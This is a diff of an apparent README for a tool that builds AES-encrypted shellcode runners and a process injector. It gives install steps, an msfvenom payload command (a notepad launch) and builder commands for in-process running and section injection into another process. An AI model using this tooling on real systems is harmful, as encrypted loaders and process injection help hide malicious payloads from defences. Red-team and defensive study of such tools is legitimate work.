@@ -45,23 +45,25 @@ for (int i = 0x00; i<=0xff;i++) {
 ``` 
 There is a loader, which just runs the shellcode in the same process via function pointer, a loader that does the same thing but via sections, and a process injector.  
 
-requirments:
+Dependencies:
 ```
 gcc
 python3
 nasm
 ```
 
-use  
-`python3 -m venv env`  
-`source env/bin/activate`  
-`pip install pycryptodome`  
-`msfvenom -p windows/x64/exec CMD='C:\Windows\System32\notepad.exe' EXITFUNC=process -f raw -o test.bin`  
-`python build.py -inbin test.bin -execmethod runner`  
-`python builder.py -inbin test.bin -execmethod section_inject --process notepad.exe --cmdline 'c:\\\\windows\\system32\\firefox.exe'`
-
-
+use like
+```bash
+python3 -m venv env  
+source env/bin/activate  
+pip install pycryptodome  
+msfvenom -p windows/x64/exec CMD='C:\Windows\System32\notepad.exe' EXITFUNC=process -f raw -o test.bin  
+python build.py -inbin test.bin -execmethod runner
+python builder.py -inbin test.bin -execmethod section_inject --process notepad.exe --cmdline 'c:\\\\windows\\system32\\firefox.exe'
 ```
+
+
+```bash
 usage: builder.py [-h] [-inbin INBIN] [-execmethod {section_inject,section_runner,section_runner_dll,runner,runner_dll}] [--process PROCESS] [--cmdline CMDLINE] [--v V]
 
 generate AES encrypted shellcode runners
